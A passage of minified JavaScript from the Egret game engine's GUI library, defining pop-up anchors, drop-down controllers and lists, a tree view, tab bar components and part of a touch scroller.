				this.popUp && "enabled" in this.popUp && (this.popUp.enabled = !1)
			};
			a.prototype.animationUpdateHandler = function (b) {
				var a = this.popUp._scrollRect,
				c = Math.round(b.currentValue.x);
				b = Math.round(b.currentValue.y);
				a ?
				(a.x = c, a.y = b, a.width = this.popUp.width, a.height = this.popUp.height) : this.popUp._scrollRect = new d.Rectangle(c, b, this.popUp.width, this.popUp.height)
			};
			a.prototype.animationEndHandler = function (b) {
				this.inAnimation = !1;
				this.popUp && "enabled" in this.popUp && (this.popUp.enabled = !0);
				this.popUp.scrollRect = null;
				this.popUpIsDisplayed || (e.PopUpManager.removePopUp(this.popUp), this.popUp.ownerChanged(null))
			};
			a.prototype.addOrRemovePopUp = function () {
				this.addedToStage && this.popUp && (null == this.popUp.parent && this.displayPopUp ?
					(e.PopUpManager.addPopUp(this.popUp, !1, !1), this.popUp.ownerChanged(this), this.popUpIsDisplayed = !0, this.inAnimation && this.animator.end(), this.initialized ? (this.applyPopUpTransform(this.width, this.height), 0 < this._openDuration && this.startAnimation()) : d.callLater(function () {
							0 < this.openDuration && this.startAnimation()
						}, this)) : null == this.popUp.parent || this.displayPopUp || this.removeAndResetPopUp())
			};
			a.prototype.removeAndResetPopUp = function () {
				this.inAnimation && this.animator.end();
				this.popUpIsDisplayed = !1;
				0 < this._closeDuration ? this.startAnimation() : (e.PopUpManager.removePopUp(this.popUp), this.popUp.ownerChanged(null))
			};
			a.prototype.applyPopUpTransform = function (b, a) {
				if (this.popUpIsDisplayed) {
					this.popUpWidthMatchesAnchorWidth && (this.popUp.width = b);
					this.popUpHeightMatchesAnchorHeight && (this.popUp.height = a);
					"validateNow" in this.popUp && this.popUp.validateNow();
					var c = this.calculatePopUpPosition();
					this.popUp.x = c.x;
					this.popUp.y = c.y
				}
			};
			a.prototype.startAnimation = function () {
				this.animator || (this.animator = new e.Animation(this.animationUpdateHandler,
							this), this.animator.endFunction = this.animationEndHandler, this.animator.startFunction = this.animationStartHandler);
				this.animator.motionPaths = this.createMotionPath();
				this.animator.duration = this.popUpIsDisplayed ? this._openDuration : this._closeDuration;
				this.animator.play()
			};
			a.prototype.createMotionPath = function () {
				var b = {
					prop : "x"
				},
				a = {
					prop : "y"
				},
				c = [b, a];
				switch (this._popUpPosition) {
				case e.PopUpPosition.TOP_LEFT:
				case e.PopUpPosition.CENTER:
				case e.PopUpPosition.BELOW:
					b.from = b.to = 0;
					a.from = this.popUp.height;
					a.to =
						0;
					this.valueRange = this.popUp.height;
					break;
				case e.PopUpPosition.ABOVE:
					b.from = b.to = 0;
					a.from = -this.popUp.height;
					a.to = 0;
					this.valueRange = this.popUp.height;
					break;
				case e.PopUpPosition.LEFT:
					a.from = a.to = 0;
					b.from = -this.popUp.width;
					b.to = 0;
					this.valueRange = this.popUp.width;
					break;
				case e.PopUpPosition.RIGHT:
					a.from = a.to = 0;
					b.from = this.popUp.width;
					b.to = 0;
					this.valueRange = this.popUp.width;
					break;
				default:
					this.valueRange = 1
				}
				this.valueRange = Math.abs(this.valueRange);
				if (!this.popUpIsDisplayed) {
					var d = b.from;
					b.from = b.to;
					b.to =
						d;
					d = a.from;
					a.from = a.to;
					a.to = d
				}
				return c
			};
			a.prototype.addedToStageHandler = function (b) {
				this.addedToStage = !0;
				d.callLater(this.checkPopUpState, this)
			};
			a.prototype.checkPopUpState = function () {
				this.addedToStage ? this.addOrRemovePopUp() : null != this.popUp && null != this.popUp.parent && this.removeAndResetPopUp()
			};
			a.prototype.removedFromStageHandler = function (b) {
				this.addedToStage = !1;
				d.callLater(this.checkPopUpState, this)
			};
			return a
		}
		(e.UIComponent);
		e.PopUpAnchor = f;
		f.prototype.__class__ = "egret.gui.PopUpAnchor"
	})(d.gui ||
		(d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._isOpen = !1;
				this._closeOnResize = !0;
				this._rollOverOpenDelay = NaN
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "openButton", {
				get : function () {
					return this._openButton
				},
				set : function (b) {
					this._openButton !== b && (this.removeOpenTriggers(), this._openButton = b, this.addOpenTriggers())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "dropDown", {
				get : function () {
					return this._dropDown
				},
				set : function (b) {
					this._dropDown !== b &&
					(this._dropDown = b)
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "isOpen", {
				get : function () {
					return this._isOpen
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "closeOnResize", {
				get : function () {
					return this._closeOnResize
				},
				set : function (b) {
					this._closeOnResize != b && (this.isOpen && this.removeCloseOnResizeTrigger(), this._closeOnResize = b, this.addCloseOnResizeTrigger())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "rollOverOpenDelay", {
				get : function () {
					return this._rollOverOpenDelay
				},
				set : function (b) {
					this._rollOverOpenDelay != b && (this.removeOpenTriggers(), this._rollOverOpenDelay = b, this.addOpenTriggers())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.addOpenTriggers = function () {
				this.openButton && (isNaN(this.rollOverOpenDelay) ? this.openButton.addEventListener(e.UIEvent.BUTTON_DOWN, this._openButton_buttonDownHandler, this) : this.openButton.addEventListener(d.TouchEvent.TOUCH_ROLL_OVER, this._openButton_rollOverHandler, this))
			};
			a.prototype.removeOpenTriggers = function () {
				this.openButton && (isNaN(this.rollOverOpenDelay) ?
					this.openButton.removeEventListener(e.UIEvent.BUTTON_DOWN, this._openButton_buttonDownHandler, this) : this.openButton.removeEventListener(d.TouchEvent.TOUCH_ROLL_OVER, this._openButton_rollOverHandler, this))
			};
			a.prototype.addCloseTriggers = function () {
				e.UIGlobals.stage && (isNaN(this.rollOverOpenDelay) ? (e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_BEGIN, this.stage_mouseDownHandler, this), e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpHandler_noRollOverOpenDelay, this)) :
					e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_MOVE, this.stage_mouseMoveHandler, this), this.addCloseOnResizeTrigger())
			};
			a.prototype.removeCloseTriggers = function () {
				e.UIGlobals.stage && (isNaN(this.rollOverOpenDelay) ? (e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_BEGIN, this.stage_mouseDownHandler, this), e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpHandler_noRollOverOpenDelay, this)) : (e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_MOVE, this.stage_mouseMoveHandler,
							this), e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpHandler, this), e.UIGlobals.stage.removeEventListener(d.Event.LEAVE_STAGE, this.stage_mouseUpHandler, this)), this.removeCloseOnResizeTrigger())
			};
			a.prototype.addCloseOnResizeTrigger = function () {
				this.closeOnResize && e.UIGlobals.stage.addEventListener(d.Event.RESIZE, this.stage_resizeHandler, this)
			};
			a.prototype.removeCloseOnResizeTrigger = function () {
				this.closeOnResize && e.UIGlobals.stage.removeEventListener(d.Event.RESIZE, this.stage_resizeHandler,
					this)
			};
			a.prototype.isTargetOverDropDownOrOpenButton = function (b) {
				if (b) {
					if (this.openButton && this.openButton.contains(b))
						return !0;
					if (null != this.hitAreaAdditions)
						for (var a = 0; a < this.hitAreaAdditions.length; a++)
							if (this.hitAreaAdditions[a] == b || this.hitAreaAdditions[a]instanceof d.DisplayObjectContainer && this.hitAreaAdditions[a].contains(b))
								return !0;
					if (this.dropDown instanceof d.DisplayObjectContainer) {
						if (this.dropDown.contains(b))
							return !0
					} else if (b == this.dropDown)
						return !0
				}
				return !1
			};
			a.prototype.openDropDown =
			function () {
				this.openDropDownHelper()
			};
			a.prototype.openDropDownHelper = function () {
				this.isOpen || (this.addCloseTriggers(), this._isOpen = !0, this.openButton && this.openButton._setKeepDown(!0), e.UIEvent.dispatchUIEvent(this, e.UIEvent.OPEN))
			};
			a.prototype.closeDropDown = function (b) {
				if (this.isOpen) {
					this._isOpen = !1;
					this.openButton && this.openButton._setKeepDown(!1);
					var a = new e.UIEvent(e.UIEvent.CLOSE, !1, !0);
					b || a.preventDefault();
					this.dispatchEvent(a);
					this.removeCloseTriggers()
				}
			};
			a.prototype._openButton_buttonDownHandler =
			function (b) {
				this.isOpen ? this.closeDropDown(!0) : (this.mouseIsDown = !0, this.openDropDownHelper())
			};
			a.prototype._openButton_rollOverHandler = function (b) {
				0 == this.rollOverOpenDelay ? this.openDropDownHelper() : (this.openButton.addEventListener(d.TouchEvent.TOUCH_ROLL_OUT, this.openButton_rollOutHandler, this), this.rollOverOpenDelayTimer = new d.Timer(this.rollOverOpenDelay, 1), this.rollOverOpenDelayTimer.addEventListener(d.TimerEvent.TIMER_COMPLETE, this.rollOverDelay_timerCompleteHandler, this), this.rollOverOpenDelayTimer.start())
			};
			a.prototype.openButton_rollOutHandler = function (b) {
				this.rollOverOpenDelayTimer && this.rollOverOpenDelayTimer.running && (this.rollOverOpenDelayTimer.stop(), this.rollOverOpenDelayTimer = null);
				this.openButton.removeEventListener(d.TouchEvent.TOUCH_ROLL_OUT, this.openButton_rollOutHandler, this)
			};
			a.prototype.rollOverDelay_timerCompleteHandler = function (b) {
				this.openButton.removeEventListener(d.TouchEvent.TOUCH_ROLL_OUT, this.openButton_rollOutHandler, this);
				this.rollOverOpenDelayTimer = null;
				this.openDropDownHelper()
			};
			a.prototype.stage_mouseDownHandler = function (b) {
				if (this.mouseIsDown)
					this.mouseIsDown = !1;
				else if (!this.dropDown || this.dropDown && (b.target == this.dropDown || this.dropDown instanceof d.DisplayObjectContainer && !this.dropDown.contains(b.target))) {
					var a = b.target;
					if (!(this.openButton && a && this.openButton.contains(a))) {
						if (null != this.hitAreaAdditions)
							for (a = 0; a < this.hitAreaAdditions.length; a++)
								if (this.hitAreaAdditions[a] == b.target || this.hitAreaAdditions[a]instanceof d.DisplayObjectContainer && this.hitAreaAdditions[a].contains(b.target))
									return;
						this.closeDropDown(!0)
					}
				}
			};
			a.prototype.stage_mouseMoveHandler = function (b) {
				this.isTargetOverDropDownOrOpenButton(b.target) || (b instanceof d.TouchEvent && b.touchDown ? (e.UIGlobals.stage.addEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpHandler, this), e.UIGlobals.stage.addEventListener(d.Event.LEAVE_STAGE, this.stage_mouseUpHandler, this)) : this.closeDropDown(!0))
			};
			a.prototype.stage_mouseUpHandler_noRollOverOpenDelay = function (b) {
				this.mouseIsDown && (this.mouseIsDown = !1)
			};
			a.prototype.stage_mouseUpHandler =
			function (b) {
				this.isTargetOverDropDownOrOpenButton(b.target) ? (e.UIGlobals.stage.removeEventListener(d.TouchEvent.TOUCH_END, this.stage_mouseUpHandler, this), e.UIGlobals.stage.removeEventListener(d.Event.LEAVE_STAGE, this.stage_mouseUpHandler, this)) : this.closeDropDown(!0)
			};
			a.prototype.stage_resizeHandler = function (b) {
				this.closeDropDown(!0)
			};
			a.prototype.stage_mouseWheelHandler = function (b) {
				!this.dropDown || this.dropDown.contains(b.target) && b.isDefaultPrevented() || this.closeDropDown(!1)
			};
			return a
		}
		(d.EventDispatcher);
		e.DropDownController = f;
		f.prototype.__class__ = "egret.gui.DropDownController"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._labelChanged = !1;
				this._userProposedSelectedIndex = d.ListBase.NO_SELECTION;
				this._captureItemRenderer = !1;
				this.dropDownController = new d.DropDownController
			}
			__extends(a, c);
			a.prototype._setDataProvider = function (b) {
				this.dataProvider !== b && (c.prototype._setDataProvider.call(this, b), this._labelChanged = !0, this.invalidateProperties())
			};
			a.prototype._setLabelField = function (b) {
				this.labelField != b && (c.prototype._setLabelField.call(this, b), this._labelChanged =
						!0, this.invalidateProperties())
			};
			a.prototype._setLabelFunction = function (b) {
				this.labelFunction != b && (c.prototype._setLabelFunction.call(this, b), this._labelChanged = !0, this.invalidateProperties())
			};
			Object.defineProperty(a.prototype, "dropDownController", {
				get : function () {
					return this._dropDownController
				},
				set : function (b) {
					this._dropDownController != b && (this._dropDownController = b, this._dropDownController.addEventListener(d.UIEvent.OPEN, this._dropDownController_openHandler, this), this._dropDownController.addEventListener(d.UIEvent.CLOSE,
							this.dropDownController_closeHandler, this), this.openButton && (this._dropDownController.openButton = this.openButton), this.dropDown && (this._dropDownController.dropDown = this.dropDown))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "isDropDownOpen", {
				get : function () {
					return this.dropDownController ? this.dropDownController.isOpen : !1
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.commitProperties = function () {
				c.prototype.commitProperties.call(this);
				this._labelChanged && (this._labelChanged = !1,
					this.updateLabelDisplay())
			};
			a.prototype.partAdded = function (b, a) {
				c.prototype.partAdded.call(this, b, a);
				a == this.openButton ? this.dropDownController && (this.dropDownController.openButton = this.openButton) : a == this.dropDown && this.dropDownController && (this.dropDownController.dropDown = this.dropDown)
			};
			a.prototype.partRemoved = function (b, a) {
				this.dropDownController && (a == this.openButton && (this.dropDownController.openButton = null), a == this.dropDown && (this.dropDownController.dropDown = null));
				c.prototype.partRemoved.call(this,
					b, a)
			};
			a.prototype.getCurrentSkinState = function () {
				return this.enabled ? this.isDropDownOpen ? "open" : "normal" : "disabled"
			};
			a.prototype.commitSelection = function (b) {
				"undefined" === typeof b && (b = !0);
				b = c.prototype.commitSelection.call(this, b);
				this.updateLabelDisplay();
				return b
			};
			a.prototype._isItemIndexSelected = function (b) {
				return this._userProposedSelectedIndex == b
			};
			a.prototype.openDropDown = function () {
				this.dropDownController.openDropDown()
			};
			a.prototype.closeDropDown = function (b) {
				this.dropDownController.closeDropDown(b)
			};
			a.prototype.updateLabelDisplay = function (b) {};
			a.prototype._changeHighlightedSelection = function (b, a) {
				this.itemSelected(this._userProposedSelectedIndex, !1);
				this._userProposedSelectedIndex = b;
				this.itemSelected(this._userProposedSelectedIndex, !0)
			};
			a.prototype.dataProvider_collectionChangeHandler = function (b) {
				c.prototype.dataProvider_collectionChangeHandler.call(this, b);
				this._labelChanged = !0;
				this.invalidateProperties()
			};
			a.prototype.item_mouseDownHandler = function (b) {
				c.prototype.item_mouseDownHandler.call(this,
					b);
				this._dispatchListEvent(b, d.ListEvent.ITEM_CLICK, b.currentTarget);
				this._userProposedSelectedIndex = this.selectedIndex;
				this.closeDropDown(!0)
			};
			a.prototype._dropDownController_openHandler = function (b) {
				this.addEventListener(d.UIEvent.UPDATE_COMPLETE, this._open_updateCompleteHandler, this);
				this._userProposedSelectedIndex = this.selectedIndex;
				this.invalidateSkinState()
			};
			a.prototype._open_updateCompleteHandler = function (b) {
				this.removeEventListener(d.UIEvent.UPDATE_COMPLETE, this._open_updateCompleteHandler,
					this);
				d.UIEvent.dispatchUIEvent(this, d.UIEvent.OPEN)
			};
			a.prototype.dropDownController_closeHandler = function (b) {
				this.addEventListener(d.UIEvent.UPDATE_COMPLETE, this.close_updateCompleteHandler, this);
				this.invalidateSkinState();
				b.isDefaultPrevented() ? this._changeHighlightedSelection(this.selectedIndex) : this._setSelectedIndex(this._userProposedSelectedIndex, !0)
			};
			a.prototype.close_updateCompleteHandler = function (b) {
				this.removeEventListener(d.UIEvent.UPDATE_COMPLETE, this.close_updateCompleteHandler, this);
				d.UIEvent.dispatchUIEvent(this, d.UIEvent.CLOSE)
			};
			a.PAGE_SIZE = 5;
			return a
		}
		(d.List);
		d.DropDownListBase = f;
		f.prototype.__class__ = "egret.gui.DropDownListBase"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.iconFieldOrFunctionChanged = !1;
				this.hostComponentKey = "egret.gui.Tree"
			}
			__extends(a, c);
			a.prototype.createChildren = function () {
				this.itemRenderer || (this.itemRenderer = a.defaultTreeRendererFactory);
				c.prototype.createChildren.call(this)
			};
			a.prototype.updateRenderer = function (b, a, d) {
				if ("hasChildren" in b && "hasChildren" in this.dataProvider) {
					var e = this.dataProvider;
					b.hasChildren = e.hasChildren(d);
					b.opened = e.isItemOpen(d);
					b.depth = e.getDepth(d);
					b.iconSkinName = this.itemToIcon(d)
				}
				return c.prototype.updateRenderer.call(this, b, a, d)
			};
			a.prototype.itemToIcon = function (b) {
				if (!b)
					return null;
				if (null != this._iconFunction)
					return this._iconFunction(b);
				var a;
				if (b instanceof Object)
					try {
						b[this.iconField] && (a = b[this.iconField])
					} catch (c) {}

				return a
			};
			a.prototype.dataGroup_rendererAddHandler = function (b) {
				c.prototype.dataGroup_rendererAddHandler.call(this, b);
				b.renderer && "hasChildren" in b.renderer && b.renderer.addEventListener(d.TreeEvent.ITEM_OPENING, this.onItemOpening,
					this)
			};
			a.prototype.onItemOpening = function (b) {
				var a = b.itemRenderer,
				c = b.item,
				f = this._getDataProvider();
				a && f && "hasChildren" in f && this.dispatchEvent(b) && (b = !a.opened, f.expandItem(c, b), d.TreeEvent.dispatchTreeEvent(this, b ? d.TreeEvent.ITEM_OPEN : d.TreeEvent.ITEM_CLOSE, a.itemIndex, c, a))
			};
			a.prototype.dataGroup_rendererRemoveHandler = function (b) {
				c.prototype.dataGroup_rendererRemoveHandler.call(this, b);
				b.renderer && "hasChildren" in b.renderer && b.renderer.removeEventListener(d.TreeEvent.ITEM_OPENING, this.onItemOpening,
					this)
			};
			Object.defineProperty(a.prototype, "iconField", {
				get : function () {
					return this._iconField
				},
				set : function (b) {
					this._iconField != b && (this._iconField = b, this.iconFieldOrFunctionChanged = !0, this.invalidateProperties())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "iconFunction", {
				get : function () {
					return this._iconFunction
				},
				set : function (b) {
					this._iconFunction != b && (this._iconFunction = b, this.iconFieldOrFunctionChanged = !0, this.invalidateProperties())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.expandItem =
			function (b, a) {
				"undefined" === typeof a && (a = !0);
				var c = this._getDataProvider();
				c && "hasChildren" in c && c.expandItem(b, a)
			};
			a.prototype.isItemOpen = function (b) {
				var a = this._getDataProvider();
				return a && "hasChildren" in a ? a.isItemOpen(b) : !1
			};
			a.prototype.dataProvider_collectionChangeHandler = function (a) {
				c.prototype.dataProvider_collectionChangeHandler.call(this, a);
				if (a.kind == d.CollectionEventKind.OPEN || a.kind == d.CollectionEventKind.CLOSE) {
					var f = this.dataGroup ? this.dataGroup.getElementAt(a.location) : null;
					f && (this.updateRenderer(f,
							a.location, a.items[0]), a.kind == d.CollectionEventKind.CLOSE && this.layout && this.layout.useVirtualLayout && (this.layout.clearVirtualLayoutCache(), this.invalidateSize()))
				}
			};
			a.prototype.commitProperties = function () {
				c.prototype.commitProperties.call(this);
				if (this.iconFieldOrFunctionChanged) {
					if (null != this.dataGroup) {
						var a;
						if (this.layout && this.layout.useVirtualLayout)
							for (var d = this.dataGroup.getElementIndicesInView(), e = d.length, f = 0; f < e; f++)
								a = d[f], this.updateRendererIconProperty(a);
						else
							for (d = this.dataGroup.numElements,
								a = 0; a < d; a++)
								this.updateRendererIconProperty(a)
					}
					this.iconFieldOrFunctionChanged = !1
				}
			};
			a.prototype.updateRendererIconProperty = function (a) {
				if (a = this.dataGroup.getElementAt(a))
					a.iconSkinName = this.itemToIcon(a.data)
			};
			a.defaultTreeRendererFactory = new d.ClassFactory(d.TreeItemRenderer);
			return a
		}
		(d.List);
		d.Tree = f;
		f.prototype.__class__ = "egret.gui.Tree"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._prompt = "";
				this.hostComponentKey = "egret.gui.DropDownList"
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "prompt", {
				get : function () {
					return this._prompt
				},
				set : function (a) {
					this._prompt != a && (this._prompt = a, this._labelChanged = !0, this.invalidateProperties())
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.partAdded = function (a, d) {
				c.prototype.partAdded.call(this, a, d);
				d == this.labelDisplay && (this._labelChanged = !0, this.invalidateProperties())
			};
			a.prototype.updateLabelDisplay = function (a) {
				"undefined" === typeof a && (a = void 0);
				this.labelDisplay && (void 0 == a && (a = this.selectedItem), this.labelDisplay.text = null != a && void 0 != a ? this.itemToLabel(a) : this._prompt)
			};
			return a
		}
		(d.DropDownListBase);
		d.DropDownList = f;
		f.prototype.__class__ = "egret.gui.DropDownList"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (d) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._allowDeselection = !0;
				this.hostComponentKey = "egret.gui.TabBarButton"
			}
			__extends(a, c);
			Object.defineProperty(a.prototype, "allowDeselection", {
				get : function () {
					return this._allowDeselection
				},
				set : function (a) {
					this._allowDeselection = a
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "data", {
				get : function () {
					return this._data
				},
				set : function (a) {
					this._data = a;
					this.dispatchEventWith("dataChange")
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "itemIndex", {
				get : function () {
					return this._itemIndex
				},
				set : function (a) {
					this._itemIndex = a
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype._setLabel = function (a) {
				a != this._getLabel() && (c.prototype._setLabel.call(this, a), this.labelDisplay && (this.labelDisplay.text = this._getLabel()))
			};
			a.prototype.buttonReleased = function () {
				this.selected && !this.allowDeselection || c.prototype.buttonReleased.call(this)
			};
			return a
		}
		(d.ToggleButtonBase);
		d.TabBarButton = f;
		f.prototype.__class__ = "egret.gui.TabBarButton"
	})(d.gui ||
		(d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this.hostComponentKey = "egret.gui.TabBar";
				this.requireSelection = !0
			}
			__extends(a, c);
			a.prototype.c = function (a) {
				a != this._requireSelection && (c.prototype._setRequireSelection.call(this, a), this.requireSelectionChanged_tabBar = !0, this.invalidateProperties())
			};
			a.prototype._setDataProvider = function (a) {
				this.dataProvider instanceof e.ViewStack && (this.dataProvider.removeEventListener("IndexChanged", this.onViewStackIndexChange, this), this.removeEventListener(e.IndexChangeEvent.CHANGE,
						this.onIndexChanged, this));
				a instanceof e.ViewStack && (a.addEventListener("IndexChanged", this.onViewStackIndexChange, this), this.addEventListener(e.IndexChangeEvent.CHANGE, this.onIndexChanged, this));
				c.prototype._setDataProvider.call(this, a)
			};
			a.prototype.onIndexChanged = function (a) {
				this.dataProvider._setSelectedIndex(a.newIndex, !1)
			};
			a.prototype.onViewStackIndexChange = function (a) {
				this._setSelectedIndex(this.dataProvider.selectedIndex, !1)
			};
			a.prototype.commitProperties = function () {
				c.prototype.commitProperties.call(this);
				if (this.requireSelectionChanged_tabBar && this.dataGroup) {
					this.requireSelectionChanged_tabBar = !1;
					for (var a = this.dataGroup.numElements, d = 0; d < a; d++) {
						var e = this.dataGroup.getElementAt(d);
						e && (e.allowDeselection = !this.requireSelection)
					}
				}
			};
			a.prototype.dataGroup_rendererAddHandler = function (a) {
				c.prototype.dataGroup_rendererAddHandler.call(this, a);
				if (a = a.renderer)
					a.addEventListener(d.TouchEvent.TOUCH_TAP, this.item_clickHandler, this), a instanceof e.TabBarButton && (a.allowDeselection = !this.requireSelection)
			};
			a.prototype.dataGroup_rendererRemoveHandler =
			function (a) {
				c.prototype.dataGroup_rendererRemoveHandler.call(this, a);
				(a = a.renderer) && a.removeEventListener(d.TouchEvent.TOUCH_TAP, this.item_clickHandler, this)
			};
			a.prototype.item_clickHandler = function (a) {
				var c = a.currentTarget,
				d;
				d = c ? c.itemIndex : this.dataGroup.getElementIndex(a.currentTarget);
				d == this.selectedIndex ? this.requireSelection || this._setSelectedIndex(e.ListBase.NO_SELECTION, !0) : this._setSelectedIndex(d, !0);
				this._dispatchListEvent(a, e.ListEvent.ITEM_CLICK, c)
			};
			return a
		}
		(e.ListBase);
		e.TabBar = f;
		f.prototype.__class__ = "egret.gui.TabBar"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (c) {
			function a() {
				c.call(this);
				this._horizontalScrollPolicy = this._verticalScrollPolicy = "auto";
				this.ignoreTouchBegin = !1;
				this._velocityY = this._velocityX = 0;
				this._previousVelocityX = [];
				this._previousVelocityY = []
			}
			__extends(a, c);
			a.prototype.measure = function () {
				this._viewport && (this.measuredWidth = this._viewport.preferredWidth, this.measuredHeight = this._viewport.preferredHeight)
			};
			a.prototype.updateDisplayList = function (a, c) {
				this._viewport.setLayoutBoundsSize(a, c)
			};
			Object.defineProperty(a.prototype,
				"verticalScrollPolicy", {
				get : function () {
					return this._verticalScrollPolicy
				},
				set : function (a) {
					this._verticalScrollPolicy = a
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "horizontalScrollPolicy", {
				get : function () {
					return this._horizontalScrollPolicy
				},
				set : function (a) {
					this._horizontalScrollPolicy = a
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(a.prototype, "viewport", {
				get : function () {
					return this._viewport
				},
				set : function (a) {
					a != this._viewport && (this.uninstallViewport(), this._viewport =
							a, this.installViewport(), this.dispatchEventWith("viewportChanged"))
				},
				enumerable : !0,
				configurable : !0
			});
			a.prototype.installViewport = function () {
				this.viewport && (this.viewport.clipAndEnableScrolling = !0, this.viewport.addEventListener(d.TouchEvent.TOUCH_BEGIN, this.onTouchBegin, this), this.viewport.addEventListener(d.TouchEvent.TOUCH_BEGIN, this.onTouchBeginCapture, this, !0), this.viewport.addEventListener(d.TouchEvent.TOUCH_END, this.onTouchEndCapture, this, !0), this._addToDisplayListAt(this.viewport, 0))
			};
			a.prototype.uninstallViewport =
			function () {
				this.viewport && (this.viewport.clipAndEnableScrolling = !1, this.viewport.removeEventListener(d.TouchEvent.TOUCH_BEGIN, this.onTouchBegin, this), this.viewport.removeEventListener(d.TouchEvent.TOUCH_BEGIN, this.onTouchBeginCapture, this, !0), this.viewport.removeEventListener(d.TouchEvent.TOUCH_END, this.onTouchEndCapture, this, !0), this._removeFromDisplayList(this.viewport))
			};
			a.prototype.onTouchEndCapture = function (a) {
				this.delayTouchBeginEvent && (a.stopPropagation(), this.delayTouchEndEvent = this.cloneTouchEvent(a),
					this.onTouchBeginTimer(), this.touchEndTimer || (this.touchEndTimer = new d.Timer(100, 1), this.touchEndTimer.addEventListener(d.TimerEvent.TIMER_COMPLETE, this.onTouchEndTimer, this)), this.touchEndTimer.start())
			};
			a.prototype.onTouchEndTimer = function (a) {
				this.touchEndTimer.stop();
				a = this.delayTouchEndEvent;
				this.delayTouchEndEvent = null;
				this.dispatchPropagationEvent(a)
			};
			a.prototype.dispatchPropagationEvent = function (a) {
				for (var c = [], d = a._target; d; )
					c.push(d), d = d.parent;
				for (var e = this._viewport, f = 1; ; f += 2) {
					d = c[f];
					if (!d || d === e)
						break;
					c.unshift(d)
				}
				d = c.indexOf(a._target);
				this._dispatchPropagationEvent(a, c, d)
			};
			a.prototype.onTouchBeginCapture = function (b) {
				var c = this.checkScrollPolicy();
				if (c) {
					for (var e = b.target; e != this; ) {
						if (e instanceof a && (c = e.checkScrollPolicy()))
							return;
						e = e.parent
					}
					this.delayTouchEndEvent && (this.delayTouchEndEvent = null, this.touchEndTimer.stop());
					b.stopPropagation();
					this.delayTouchBeginEvent = this.cloneTouchEvent(b);
					this.touchBeginTimer || (this.touchBeginTimer = new d.Timer(100, 1), this.touchBeginTimer.addEventListener(d.TimerEvent.TIMER_COMPLETE,
							this.onTouchBeginTimer, this));
					this.touchBeginTimer.start();
					this.onTouchBegin(b)
				}
			};
			a.prototype.cloneTouchEvent = function (a) {
				var c = new d.TouchEvent(a._type, a._bubbles, a.cancelable);
				c.touchPointID = a.touchPointID;
				c._stageX = a._stageX;
				c._stageY = a._stageY;
				c.ctrlKey = a.ctrlKey;
				c.altKey = a.altKey;
				c.shiftKey = a.shiftKey;
				c.touchDown = a.touchDown;
				c._isDefaultPrevented = !1;
				c._target = a._target;
				return c
			};
			a.prototype.onTouchBeginTimer = function (a) {
